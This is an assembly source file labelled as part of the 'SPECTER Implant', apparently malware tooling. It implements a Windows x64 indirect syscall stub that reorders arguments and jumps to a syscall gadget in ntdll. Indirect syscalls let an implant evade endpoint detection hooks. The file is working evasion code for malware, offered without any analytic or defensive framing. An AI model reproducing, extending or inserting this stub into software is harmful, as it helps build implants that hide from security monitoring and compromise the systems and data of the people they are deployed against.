/**
 * SPECTER Implant — Indirect Syscall Stub (GAS / Intel syntax)
 *
 * NTSTATUS spec_syscall(DWORD ssn, PVOID syscall_addr, ...)
 *
 * Windows x64 calling convention on entry:
 *   ECX = ssn            (1st param)
 *   RDX = syscall_addr   (2nd param)
 *   R8  = real arg1      (3rd param → becomes 1st syscall arg)
 *   R9  = real arg2      (4th param → becomes 2nd syscall arg)
 *   [RSP+0x28] = real arg3  (5th param → becomes 3rd syscall arg)
 *   [RSP+0x30] = real arg4  (6th param → becomes 4th syscall arg)
 *   [RSP+0x38..] = real arg5+ (→ becomes 5th+ syscall arg)
 *
 * We shift everything down by 2 slots, set R10=RCX (kernel ABI),
 * move SSN→EAX, and JMP to the syscall;ret gadget in ntdll.
 */

    .intel_syntax noprefix
    .text
    .global spec_syscall

spec_syscall:
    /*
     * Spill SSN and syscall_addr into our caller's shadow space.
     * Shadow space is [RSP+0x08..RSP+0x20] — guaranteed by Win x64 ABI.
     */
    mov     [rsp + 0x08], ecx      /* save SSN (DWORD) */
    mov     [rsp + 0x10], rdx      /* save syscall_addr */

    /* Shift register arguments: consume our 2 synthetic params */
    mov     rcx, r8                /* real arg1 → RCX */
    mov     rdx, r9                /* real arg2 → RDX */
    mov     r8,  [rsp + 0x28]     /* real arg3 → R8 */
    mov     r9,  [rsp + 0x30]     /* real arg4 → R9 */

    /*
     * Shift stack arguments down by 2 slots (0x10 bytes).
     * This maps our caller's 5th+ params to the positions the
     * kernel expects for the target syscall's 5th+ params.
     * Supports up to 8 additional stack args (12 total syscall args).
     */
    mov     rax, [rsp + 0x38]
    mov     [rsp + 0x28], rax
    mov     rax, [rsp + 0x40]
    mov     [rsp + 0x30], rax
    mov     rax, [rsp + 0x48]
    mov     [rsp + 0x38], rax
    mov     rax, [rsp + 0x50]
    mov     [rsp + 0x40], rax
    mov     rax, [rsp + 0x58]
    mov     [rsp + 0x48], rax
    mov     rax, [rsp + 0x60]
    mov     [rsp + 0x50], rax
    mov     rax, [rsp + 0x68]
    mov     [rsp + 0x58], rax
    mov     rax, [rsp + 0x70]
    mov     [rsp + 0x60], rax

    /* R10 = RCX — Windows kernel syscall ABI requirement */
    mov     r10, rcx

    /* Load SSN into EAX */
    mov     eax, [rsp + 0x08]

    /* Load syscall gadget address into R11 */
    mov     r11, [rsp + 0x10]

    /* Indirect syscall: JMP to the syscall;ret gadget in ntdll.
     * The gadget executes `syscall` then `ret`, which returns
     * directly to our caller. */
    jmp     r11
